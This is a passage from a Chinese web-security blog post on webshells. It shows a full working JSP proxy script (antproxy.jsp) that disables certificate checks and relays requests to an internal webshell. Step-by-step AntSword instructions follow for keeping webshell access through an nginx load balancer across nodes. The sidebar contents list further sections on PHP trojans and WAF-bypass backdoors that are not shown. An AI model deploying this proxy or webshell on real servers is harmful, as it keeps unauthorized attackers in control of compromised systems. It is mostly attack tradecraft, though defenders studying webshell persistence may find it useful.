class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page import=&quot;javax.net.ssl.*&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page import=&quot;java.io.DataInputStream&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page import=&quot;java.io.OutputStream&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page import=&quot;java.net.HttpURLConnection&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page import=&quot;java.net.URL&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page import=&quot;java.security.KeyManagementException&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page import=&quot;java.security.NoSuchAlgorithmException&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page import=&quot;java.security.cert.CertificateException&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page import=&quot;java.security.cert.X509Certificate&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line"></span><br><span class="line">  public static void ignoreSsl() throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        HostnameVerifier hv = new HostnameVerifier() &#123;</span><br><span class="line"></span><br><span class="line">            public boolean verify(String urlHostName, SSLSession session) &#123;</span><br><span class="line"></span><br><span class="line">                return true;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        trustAllHttpsCertificates();</span><br><span class="line"></span><br><span class="line">        HttpsURLConnection.setDefaultHostnameVerifier(hv);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static void trustAllHttpsCertificates() throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        TrustManager[] trustAllCerts = new TrustManager[] &#123; new X509TrustManager() &#123;</span><br><span class="line"></span><br><span class="line">            public X509Certificate[] getAcceptedIssuers() &#123;</span><br><span class="line"></span><br><span class="line">                return null;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line"></span><br><span class="line">            public void checkClientTrusted(X509Certificate[] arg0, String arg1) throws CertificateException &#123;</span><br><span class="line"></span><br><span class="line">                // Not implemented</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line"></span><br><span class="line">            public void checkServerTrusted(X509Certificate[] arg0, String arg1) throws CertificateException &#123;</span><br><span class="line"></span><br><span class="line">                // Not implemented</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; &#125;;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line"></span><br><span class="line">            SSLContext sc = SSLContext.getInstance(&quot;TLS&quot;);</span><br><span class="line"></span><br><span class="line">            sc.init(null, trustAllCerts, new java.security.SecureRandom());</span><br><span class="line"></span><br><span class="line">            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());</span><br><span class="line"></span><br><span class="line">        &#125; catch (KeyManagementException e) &#123;</span><br><span class="line"></span><br><span class="line">            e.printStackTrace();</span><br><span class="line"></span><br><span class="line">        &#125; catch (NoSuchAlgorithmException e) &#123;</span><br><span class="line"></span><br><span class="line">            e.printStackTrace();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line">        String target = &quot;http://172.21.0.2:8080/ant.jsp&quot;;</span><br><span class="line"></span><br><span class="line">        URL url = new URL(target);</span><br><span class="line"></span><br><span class="line">        if (&quot;https&quot;.equalsIgnoreCase(url.getProtocol())) &#123;</span><br><span class="line"></span><br><span class="line">            ignoreSsl();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        HttpURLConnection conn = (HttpURLConnection)url.openConnection();</span><br><span class="line"></span><br><span class="line">        StringBuilder sb = new StringBuilder();</span><br><span class="line"></span><br><span class="line">        conn.setRequestMethod(request.getMethod());</span><br><span class="line"></span><br><span class="line">        conn.setConnectTimeout(30000);</span><br><span class="line"></span><br><span class="line">        conn.setDoOutput(true);</span><br><span class="line"></span><br><span class="line">        conn.setDoInput(true);</span><br><span class="line"></span><br><span class="line">        conn.setInstanceFollowRedirects(false);</span><br><span class="line"></span><br><span class="line">        conn.connect();</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos=new ByteArrayOutputStream();</span><br><span class="line"></span><br><span class="line">        OutputStream out2 = conn.getOutputStream();</span><br><span class="line"></span><br><span class="line">        DataInputStream in=new DataInputStream(request.getInputStream());</span><br><span class="line"></span><br><span class="line">        byte[] buf = new byte[1024];</span><br><span class="line"></span><br><span class="line">        int len = 0;</span><br><span class="line"></span><br><span class="line">        while ((len = in.read(buf)) != -1) &#123;</span><br><span class="line"></span><br><span class="line">            baos.write(buf, 0, len);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        baos.flush();</span><br><span class="line"></span><br><span class="line">        baos.writeTo(out2);</span><br><span class="line"></span><br><span class="line">        baos.close();</span><br><span class="line"></span><br><span class="line">        InputStream inputStream = conn.getInputStream();</span><br><span class="line"></span><br><span class="line">        OutputStream out3=response.getOutputStream();</span><br><span class="line"></span><br><span class="line">        int len2 = 0;</span><br><span class="line"></span><br><span class="line">        while ((len2 = inputStream.read(buf)) != -1) &#123;</span><br><span class="line"></span><br><span class="line">            out3.write(buf, 0, len2);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        out3.flush();</span><br><span class="line"></span><br><span class="line">        out3.close();</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>a) 不要使用上传功能</strong>，上传功能会分片上传，导致分散在不同 Node 上。</p>
<p><strong>b)</strong> 要保证每一台 Node 上都有相同路径的 antproxy.jsp, 所以我疯狂保存了很多次，保证每一台都上传了脚本</p>
<p>保存的一些小技巧</p>
<p>比如像改修 127.21.0.3 变为 172.21.0.2，需要连续两次在同一个页面修改为.2，连续保存两次</p>
<p>第二次修改的时候已经是.2 了，你先随便改改，然后改回.2 在保存，这样能省很多事</p>
<p><strong>2. 修改 Shell 配置，将 URL 部分填写为 antproxy.jsp 的地址，其它配置不变</strong></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221225183112937.png" alt="image-20221225183112937"></p>
<p><strong>3. 测试执行命令，查看 IP</strong></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221225183137011.png" alt="image-20221225183137011"></p>
<p>可以看到 IP 已经固定，意味着请求已经固定到了 LBSNode1 这台机器上了。此时使用分片上传、HTTP 代理，都已经跟单机的情况没什么区别了。</p>
<p>Node1 和 Node2 交叉着访问 Node1 的 /ant.jsp 文件，符合 nginx 此时的 LBS 策略。</p>
<p><strong>优点：</strong></p>
<ul>
<li>低权限就可以完成，如果权限高的话，还可以通过端口层面直接转发，不过这跟 Plan A 的关服务就没啥区别了</li>
<li>流量上，只影响访问 WebShell 的请求，其它的正常业务请求不会影响。</li>
<li>适配更多工具</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>该方案需要「目标 Node」和「其它 Node」 之间内网互通，如果不互通就凉了（敲黑板：加固方案快记下来）</li>
</ul>
<p>如果你的蚁剑不能连接 jsp，那就升级～</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvNEJtel9mdXUweXJMTUsxb0JLS3RSQQ==">负载均衡下的 WebShell 连接 (qq.com)</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FudFN3b3JkUHJvamVjdC9BbnRTd29yZC1MYWJz">AntSwordProject/AntSword-Labs: Awesome environment for antsword tests (github.com)</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl82MDcxOTc4MC9hcnRpY2xlL2RldGFpbHMvMTI4MjM5NzY3">负载均衡反向代理下的 webshell_奋斗的小智的博客 - CSDN 博客</span></p>

  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">Edited on</span>
    <time title="Modified: 2022-12-25 18:50:17" itemprop="dateModified" datetime="2022-12-25T18:50:17+08:00">2022-12-25</time>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> Donate</button>
  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt="John Doe WeChat Pay">
        <p>WeChat Pay</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt="John Doe Alipay">
        <p>Alipay</p>
      </div>
      
      <div>
        <img data-src="/images/paypal.png" alt="John Doe PayPal">
        <p>PayPal</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>Post author:  </strong>John Doe <i class="ic i-at"><em>@</em></i>Hexo
  </li>
  <li class="link">
    <strong>Post link: </strong>
    <a href="http://example.com/2022/12/31/webshell/" title="webshell">http://example.com/2022/12/31/webshell/</a>
  </li>
  <li class="license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2022/12/28/mysql/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipexbei4hj20zk0m8npd.jpg" title="Mysql">
  <span class="type">Previous Post</span>
  <span class="category"><i class="ic i-flag"></i> </span>
  <h3>Mysql</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/2023/01/03/%E6%BB%B4%E6%B0%B4reverse/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipevarprfj20zk0m8npd.jpg" title="水滴rev">
  <span class="type">Next Post</span>
  <span class="category"><i class="ic i-flag"></i> 逆向</span>
  <h3>水滴rev</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="Contents">
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#php-webshell"><span class="toc-number">1.</span> <span class="toc-text"> php webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#eval%E4%B8%8Eassert%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text"> eval 与 assert 一句话木马分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#eval%E5%AE%9A%E4%B9%89%E5%92%8C%E7%94%A8%E6%B3%95"><span class="toc-number">1.1.1.</span> <span class="toc-text"> eval 定义和用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#assert%E7%9A%84%E5%AE%9A%E4%B9%89%E4%B8%8E%E7%94%A8%E6%B3%95"><span class="toc-number">1.1.2.</span> <span class="toc-text"> assert 的定义与用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eval%E4%B8%8Eassert%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.1.3.</span> <span class="toc-text"> eval 与 assert 的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%8F%AF%E5%8F%98%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.4.</span> <span class="toc-text"> php 可变函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-%E8%AF%AD%E6%B3%95%E6%9E%84%E9%80%A0%E5%99%A8"><span class="toc-number">1.1.5.</span> <span class="toc-text"> php 语法构造器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.6.</span> <span class="toc-text"> 一句话木马的原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#_post1_post2"><span class="toc-number">1.1.7.</span> <span class="toc-text"> \_POST\[&#39;1&#39;](_POST[‘2’]);</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F%E4%B8%80"><span class="toc-number">1.1.7.1.</span> <span class="toc-text"> 连接方式一：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F%E4%BA%8C"><span class="toc-number">1.1.7.2.</span> <span class="toc-text"> 连接方式二：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E8%83%BD%E5%86%99%E6%88%901eval2%E8%BF%99%E7%A7%8D%E5%BD%A2%E5%BC%8F%E5%91%A2"><span class="toc-number">1.1.7.3.</span> <span class="toc-text"> 不能写成 1&#x3D;eval&amp;2  这种形式呢</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php7%E4%B8%AD%E7%9A%84assert"><span class="toc-number">1.1.8.</span> <span class="toc-text"> php7 中的 assert</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%8F%98%E5%BD%A2"><span class="toc-number">1.2.</span> <span class="toc-text"> php 一句话木马变形</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass%E5%90%84%E7%A7%8Dwaf-php%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8"><span class="toc-number">1.3.</span> <span class="toc-text"> bypass 各种 waf-php 回调后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E6%9C%80%E5%88%9D%E7%9A%84%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 0x01 最初的回调后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E6%95%B0%E7%BB%84%E6%93%8D%E4%BD%9C%E9%80%A0%E6%88%90%E7%9A%84%E5%8D%95%E5%8F%82%E6%95%B0%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 0x02 数组操作造成的单参数回调后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-php548%E4%B8%AD%E7%9A%84assert"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 0x03 php5.4.8 + 中的 assert</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E4%B8%89%E5%8F%82%E6%95%B0%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.4.</span> <span class="toc-text"> 0x04 三参数回调函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-%E5%8D%95%E5%8F%82%E6%95%B0%E5%90%8E%E9%97%A8%E7%BB%88%E6%9E%81%E5%A5%A5%E4%B9%89"><span class="toc-number">1.3.5.</span> <span class="toc-text"> 0x05 单参数后门终极奥义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-%E5%85%B6%E4%BB%96%E5%8F%82%E6%95%B0%E5%9E%8B%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8"><span class="toc-number">1.3.6.</span> <span class="toc-text"> 0x06 其他参数型回调后门</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell"><span class="toc-number">1.4.</span> <span class="toc-text"> 一些不包含数字和字母的 webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">1.4.1.</span> <span class="toc-text"> 方法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">1.4.2.</span> <span class="toc-text"> 方法二</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89"><span class="toc-number">1.4.3.</span> <span class="toc-text"> 方法三</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97webshell%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.5.</span> <span class="toc-text"> 无字母数字 webshell 之命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php7-%E4%B8%8B%E7%AE%80%E5%8D%95%E8%A7%A3%E5%86%B3%E9%97%AE%E9%A2%98"><span class="toc-number">1.5.1.</span> <span class="toc-text"> PHP7 下简单解决问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php5%E7%9A%84%E6%80%9D%E8%80%83"><span class="toc-number">1.5.2.</span> <span class="toc-text"> PHP5 的思考</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#niginx%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%8B%E7%9A%84webshell"><span class="toc-number">1.6.</span> <span class="toc-text"> niginx 负载均衡下的 webshell</span></a></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="Related">
        <ul>
          <li><a href="/2022/03/16/SQL%E6%B3%A8%E5%85%A5/" rel="bookmark" title="SQL injection">SQL injection</a></li><li><a href="/2022/04/16/Upload/" rel="bookmark" title="File upload">File upload</a></li><li><a href="/2022/05/17/include/" rel="bookmark" title="file include">file include</a></li><li><a href="/2022/05/27/CSRF/" rel="bookmark" title="CSRF">CSRF</a></li><li><a href="/2022/06/27/SSRF/" rel="bookmark" title="SSRF">SSRF</a></li><li><a href="/2022/08/16/Unserialize/" rel="bookmark" title="unserialize">unserialize</a></li><li><a href="/2022/11/17/JWT%20%E5%9F%BA%E7%A1%80/" rel="bookmark" title="JWT">JWT</a></li><li><a href="/2022/11/27/CDN/" rel="bookmark" title="CDN&DNS">CDN&DNS</a></li><li><a href="/2022/11/27/Docker%E9%80%83%E9%80%B8/" rel="bookmark" title="docker逃逸&capabilities">docker逃逸&capabilities</a></li><li><a href="/2022/12/27/SSTI/" rel="bookmark" title="SSTI">SSTI</a></li><li class="active"><a href="/2022/12/31/webshell/" rel="bookmark" title="webshell">webshell</a></li>
        </ul>
      </div>
      <div class="overview panel" data-title="Overview">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="John Doe"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">John Doe</p>
  <div class="description" itemprop="description"></div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">24</span>
        <span class="name">posts</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">4</span>
        <span class="name">categories</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">4</span>
        <span class="name">tags</span>
      </a>
    </div>
</nav>

<div class="social">
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/2022/12/28/mysql/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/2023/01/03/%E6%BB%B4%E6%B0%B4reverse/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>Random Posts</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/12/31/webshell/" title="webshell">webshell</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/11/17/JWT%20%E5%9F%BA%E7%A1%80/" title="JWT">JWT</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/12/28/mysql/" title="Mysql">Mysql</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E9%80%86%E5%90%91/" title="In 逆向">逆向</a>
</div>

    <span><a href="/2022/11/01/%E6%B1%87%E7%BC%96/" title="汇编">汇编</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%86%85%E7%BD%91/" title="In 内网">内网</a>
</div>

    <span><a href="/2022/05/27/emergency%20response/" title="应急响应">应急响应</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/12/27/SSTI/" title="SSTI">SSTI</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/02/21/https%E5%8E%9F%E7%90%86/" title="https+TLS">https+TLS</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/04/16/Upload/" title="File upload">File upload</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/11/27/Docker%E9%80%83%E9%80%B8/" title="docker逃逸&amp;capabilities">docker逃逸&capabilities</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%86%85%E7%BD%91/" title="In 内网">内网</a>
</div>

    <span><a href="/2022/12/25/%E5%86%85%E7%BD%91/" title="内网渗透">内网渗透</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>Recent Comments</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">John Doe @ Yume Shoka</span>
  </div>
  <div class="powered-by">
    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2022/12/31/webshell/',
    favicon: {
      show: "（●´3｀●）Goooood",
      hide: "(´Д｀)Booooom"
    },
    search : {
      placeholder: "Search for Posts",
      empty: "We didn't find any results for the search: ${query}",
      stats: "${hits} results found in ${time} ms"
    },
    valine: true,fancybox: true,
    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
